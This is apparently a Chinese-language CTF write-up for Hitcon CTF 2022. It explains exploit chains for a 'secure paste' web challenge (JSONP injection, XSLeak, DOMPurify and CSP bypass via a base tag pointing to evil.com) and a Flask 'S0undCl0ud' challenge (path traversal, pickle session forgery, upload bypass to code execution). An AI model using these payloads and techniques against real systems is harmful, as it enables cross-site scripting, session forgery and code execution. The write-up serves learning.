---
date: '2022-11-29T14:31:08+08:00'
draft: false
title: Hitcon CTF 2022
tags: [CTF]
---

## secure paste

题面是一个端到端加密的 pastebin，key 在前端生成不走后端，访问的时候放在 hash 里，flag 的 url 是可以直接拿到的，但是没有key。

在访问提供的 url 之前，bot 会先把 flag 的 url 带上 key 访问一遍，然后直接page.goto，所以 key 应该是要用 history.back 拿到。

首先是一个显而易见的注入，在 paste.ejs 里

```js
window.onload = () => {
    const id = new URLSearchParams(location.search).get('id')
    const script = document.createElement('script')
    script.src = `/api/pastes/${id}?callback=load`
    script.nonce = '<%= nonce %>'
    document.body.appendChild(script)
}
```

这里id是可控的，也就可以注入 callback 参数执行 js 函数，不过是有限制的，可以从 express 的源码中看到

```js
// restrict callback charset
callback = callback.replace(/[^\[\]\w$.]/g, '');
```

也就是没法使用 bind 的方法来设置参数调用任意函数。



### XSLeak

先讲一个 XSLeak 的非预期，很方便的做法，可能最快做出来的那个队就是这样打的吧。

构造一个 `window.open` 的chain，a.html -> b.html -> c.html -> d.html

- a先open b，然后 `history.back()`

- b有很多iframe，name分别是base64的charset，然后open c

- c open d

- d 把 c navigate 到可以 jsonp 的那个题目页面，用 jsonp 执行

    ```
    opener[opener.opener.location.hash[i]].focus
    ```

- b检查 frame 的 active 情况，然后上报

这种做法的关键在于即使 b 和 c 不是同源的，c 也可以访问到 b 的 frames 和 opener，然后因为 b 的 opener 是 a，和 c 是同源的，也就可以拿到 a 的 location。



### XSS

offical 的做法，在 paste 页面实现任意 xss。

光是有jsonp能做的事情显然是不够的，需要找其他可以执行js的地方

```js
if (data.type === 'markdown') {
    const div = document.createElement('div')
    div.innerHTML = await fputils.acompose(
        DOMPurify.sanitize, marked.parse, getContent
    )({ ...ctx, ct: data.content })
    disp.appendChild(div)
} else {
    const pre = document.createElement('pre')
    pre.textContent = await getContent({ ...ctx, ct: data.content })
    disp.appendChild(pre)
}
```

在 paste 页面 decrypt 的地方可以看到 decrypt 的逻辑，这里如果不是 markdown 类型，是对 textContent 赋值，肯定没法 xss 的，而 markdown 类型解密出来是直接对 innerHTML 赋值，如果能绕过 DOMPurify 的话还有点机会（众所周知，DOMPurify 存在的意义就是被绕过），但 markdown 格式需要有 premium token 才能用。

看 bot 的代码可以注意到，实际上我们是有一个 type 为 markdown 的 paste 的，也就是 flag 的那个 paste，虽然只有一个 id，也没有解密的 key。

```js
// Giving you the url of the secret should be safe because you don't have decryption key :)
await page.goto(url + '?from=' + encodeURIComponent(urlNoKey))
```

那有没有机会在 decrypt 的时候做事情呢？



#### The crypto bug

首先是crypto部分中的bug

```js
CryptoUtils.prototype.decrypt = async function (obj) {
    const ctx = { ...obj, name: this.name, additionalData: this.additionalData }
    const key = await crypto.subtle.importKey(ctx.key.type, ctx.key.data, ctx, true, ['decrypt'])
    return new Uint8Array(await crypto.subtle.decrypt(ctx, key, ctx.ct))
}
```

这里的定义看起来没啥问题，但是在实际使用的时候

```js
const cu = new CryptoUtils()
// ...
const getContent = fputils.acompose(updateTitleAndGetContent, JSON.parse, utils.textDecode, cu.decrypt)
```

这里 CryptoUtils.decrypt 中的 this 在实际使用时指向的其实是 window 对象，可以拿下面的代码测试一下

```js
function CryptoUtils() {
    this.name ||= 'AES-GCM'
}
CryptoUtils.prototype.decrypt = async function (obj) {
    console.log(this)
    return this.name
}
const cu = new CryptoUtils()
console.log(cu.decrypt())

const decrypt = cu.decrypt
console.log(decrypt())
```

这显然是有问题的，但实际上题目的功能却很完整，这是因为题目中还有别的 bug，crypto.js 这里定义了 CryptoUtils 并将其返回

```js
(function (root, factory) {
    if (typeof define === 'function' && define.amd) {
        return define(['webcrypto', 'utils'], factory)
    } else if (typeof exports === 'object') {
        return (module.exports = factory(require('crypto').webcrypto, require('./utils')))
    } else {
        return (root.CryptoUtils = factory(crypto, utils))
    }
})(this, function (crypto, utils) {
    function CryptoUtils() {
        this.name ||= 'AES-GCM'
        this.additionalData ||= utils.textEncode('Secure Paste Encrypted Data')
    }
    // ...
    return CryptoUtils
})
```

这里结束的时候并没有添加分号（js 目录下其他文件都加了），这就导致在 bundle 的时候和下一个文件中的括号直接连起来，CryptoUtils 会被调用，而下一个文件内的东西会被作为参数。

```js
const bundlejs = (() => {
    // poor man's javascript bundler
    const DIR = 'static/js'
    let js = ''
    for (const f of ['utils.js', 'crypto.js', 'fputils.js', 'jsonplus.js']) {
        js += fs.readFileSync(`${DIR}/${f}`, 'utf-8') + '\n'
    }
    return js
})()
```

但是如果下一个文件内的第一个括号被当作函数调用，那下一个文件内第二个括号内的东西应该会出问题，为什么一切都很正常呢？

可以来看下下一个 js 文件 fputils.js

```js
((function (root, factory) {
    // ...
})(this, function () {
    // ...
}));
```

这里在整个表达式外又加了一个括号（其他几个 js 文件都没有这样做），这样就保证了原来的语义，使表达式可以正常执行，由于CryptoUtils 函数不需要参数，所以执行结果也没有起作用。

CryptoUtils 函数被直接调用而不是new出来的话，this.name 也就是 window.name 就被设置了，这样在 decrypt 的时候就不会出错了。

> 两个 bug 合起来使代码可以 work，还是挺离谱的，作者也确实加了一些“看起来不太寻常但又感觉没啥问题”的改动

window.name 是算法，hash 是 key，这两个都是可控的，这时候就可以控制 decrypt 出来的内容了。



#### DOMPurify bypass

虽然已经可以控制 decrypt 出来的内容了，但是还有 DOMPurify 需要绕过。

看 DOMPurify.sanitize 的源码可以发现

```js
DOMPurify.sanitize = function (dirty, cfg = {}) {
    // ...

    /* Check we can run. Otherwise fall back or ignore */
    if (!DOMPurify.isSupported) {
        if (
            typeof window.toStaticHTML === 'object' ||
            typeof window.toStaticHTML === 'function'
        ) {
            if (typeof dirty === 'string') {
                return window.toStaticHTML(dirty);
            }
            if (_isNode(dirty)) {
                return window.toStaticHTML(dirty.outerHTML);
            }
        }
        return dirty;
    }
}
```

DOMPurify 有个 isSupported 属性，可以利用 jsonp 是把这个属性 delete 掉

```js
delete[DOMPurify][0].isSupported
```

但是一个页面只能执行一次 jsonp 的 callback，需要再打开一个 paste 页面，利用

```js
delete[opener.DOMPurify][0].isSupported
```

这里可能会不成功，需要 race 一下，使 xss 发生页面的 callback 在 DOMPurify 被禁掉之后被调用。


#### CSP bypass

虽然现在可以注入任意 html 了，但是还有 CSP 的限制，还不能随便执行 js

```js
app.use((req, res, next) => {
    const nonce = crypto.randomBytes(16).toString('hex')
    res.locals.nonce = nonce
    res.set(
        'Content-Security-Policy',
        `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'; img-src *; frame-src 'none'; object-src 'none'`
    )
    res.set('X-Frame-Options', 'DENY')
    res.set('X-Content-Type-Options', 'nosniff')
    next()
})
```

把 CSP 的内容放到 [CSP Evaluator](https://csp-evaluator.withgoogle.com/) 里可以发现缺了 base-url，所以可以注入 base tag

```js
<base href="http://evil.com">
```

然后利用 onload 时 create 出来的带 nonce 的 script 标签来加载外部 js 代码。


#### Exp

所以整个利用过程可以总结为

- 给 bot 一个 url，打开 a 页面
- a 页面打开 b 页面，然后 history.back()
- b 页面打开 c 页面
- c 页面利用 jsonp 把 b 页面的 DOMPurify 禁掉
- b 页面控制 decrypt 出的 xss payload 拿到 opener.location，也就是 a 的location


## S0undCl0ud

题目是一个云服务，可以传 music，后端是 flask。

第一个 bug 在 get music 的时候，没有对 username 做检查，可以路径穿越

```python
@app.get("/@<username>/<file>")
def music(username, file):
    return send_from_directory(f"musics/{username}", file, mimetype="application/octet-stream")
```

不过由于不能有`/`，只能穿一层，可以拿到 app.py 的源码，也就可以拿到 secret_key。

有了 secret_key 就可以伪造 session 了

```py
payload = pickle.dumps(data)
s = TimestampSigner(
    secret_key=app.secret_key,
    salt='cookie-session',
    digest_method=hashlib.sha1,
    key_derivation='hmac',
).sign(base64_encode(payload)).decode()
print(s)
```

这里 session serializer 用的是 pickle，open session 的时候会调用 pickle.loads，可以在这里做一些事情，不过题目中pickle的 loads 被替换了。

```python
def loads_with_validate(data, *args, **kwargs):
    opcodes = pickletools.genops(data)

    allowed_args = ['user_id', 'musics', None]
    if not all(op[1] in allowed_args 
               or type(op[1]) == int 
               or type(op[1]) == str and re.match(r"^musics/[^/]+/[^/]+$", op[1])
               for op in opcodes):
        return {}

    allowed_ops = ['PROTO', 'FRAME', 'MEMOIZE', 'MARK', 'STOP',
                   'EMPTY_DICT', 'EMPTY_LIST', 'SHORT_BINUNICODE', 'BININT1',
                   'APPEND', 'APPENDS', 'SETITEM', 'SETITEMS']
    if not all(op[0].name in allowed_ops for op in opcodes):
        return {}

    return _pickle_loads(data, *args, **kwargs)

pickle.loads = loads_with_validate
```

虽然看起来只有一些没啥用的 opcode 可以用，但实际上 allow_ops 的限制没什么作用，只是一个纸老虎，因为 genops 返回的是一个 generator，在第一次 not all 的时候iter已经迭代完了，第二次 not all 肯定会过。

```py
import pickletools
import pickle

data = pickle.dumps(1)
opcodes = pickletools.genops(data)
print(opcodes)
for op in opcodes:
    print(op)
print(len([op for op in opcodes]))
'''
<generator object _genops at 0x7f5ecc2112e0>
(<pickletools.OpcodeInfo object at 0x7f5ecc188a60>, 4, 0)
(<pickletools.OpcodeInfo object at 0x7f5ecc1653a0>, 1, 2)
(<pickletools.OpcodeInfo object at 0x7f5ecc188ac0>, None, 4)
0
'''
```

所以其实是可以使用任意 opcode 的，但是第一次 not all 的时候对 opcode 的参数做了限制。

既然有 music 文件夹，也可以在 music 文件夹下写文件，可以考虑利用 pickle 中的 global 操作符把 music 下的文件 import 进来。

上传文件时有一个 mimetypes 的文件类型校验

```python
if mimetypes.guess_type(file.filename)[0] in AUDIO_MIMETYPES \
    and magic.from_buffer(file.stream.read(), mime=True) in AUDIO_MIMETYPES:
```

文件内容的 check 可以通过构造文件头来绕过，文件名的 check 可以用 data 协议配合 safe_join 来绕过

```python
>>> mimetypes.guess_type('data:audio/mp4,/../../__init__.py')
('audio/mp4', None)
```

safe_join 的时候会先调用 posixpath.normpath，所以 join 的时候可以变成正常的路径

```python
>>> posixpath.normpath('data:audio/mp4,/../../__init__.py')
'__init__.py'
```

```python
>>> safe_join('music', 'abc/../', 'data:audio/mp4,/../../__init__.py')
'music/./__init__.py'
```

这样只要 import music 就可以执行任意 python 代码了。


## void

To be continued ...